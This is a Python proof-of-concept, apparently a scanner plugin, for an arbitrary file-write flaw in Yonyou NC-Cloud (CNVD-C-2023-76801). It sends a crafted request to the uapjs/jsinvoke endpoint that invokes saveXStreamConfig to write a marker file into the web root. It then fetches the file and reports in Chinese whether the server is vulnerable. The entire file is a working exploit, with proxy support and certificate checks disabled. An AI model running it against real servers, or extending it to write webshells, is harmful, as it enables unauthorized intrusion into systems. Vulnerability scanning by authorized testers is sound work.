import requests
import re
from bs4 import BeautifulSoup
import logging

uia=''
http = ''
https = ''
def dl201(dl):
    global http,https
    http=dl
    https=dl
def ty(url,s_cookie=None):
    global uia
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            "DNT": "1",
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0"
        }
        data = {
            "serviceName": "nc.itf.iufo.IBaseSPService",
            "methodName": "saveXStreamConfig",
            "parameterTypes": ["java.lang.Object", "java.lang.String"],
            "parameters": [
                "ceshineirong","webapps/nc_web/test2.txt"
            ]
        }
        logging.captureWarnings(True)
        gf = requests.post(url+'uapjs/jsinvoke/?action=invoke',json=data,cookies=s_cookie,headers=headers,proxies=proxies,verify=False)
        if gf.status_code == 200:
            gf1 = requests.get(url + 'test2.txt',cookies=s_cookie,proxies=proxies, verify=False)
            if 'ceshineirong' in gf1.text:
                uia = '[+]漏洞存在\n'+gf1.text
            else:
                uia = '[-]漏洞不存在'
        else:
            uia = '[-]漏洞不存在'
    except Exception as aaa:
        uia = '[-]请求错误\n' + str(aaa)
def yt1():
    global uia
    return '--------------------------------------------------\n[ 用友-NC-Cloud CNVD-C-2023-76801]\n\n'+ str (uia)+'\n'
def yt1a(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        ty(url1,s_cookie)
    elif pd=='1':
        ty(url1,s_cookie)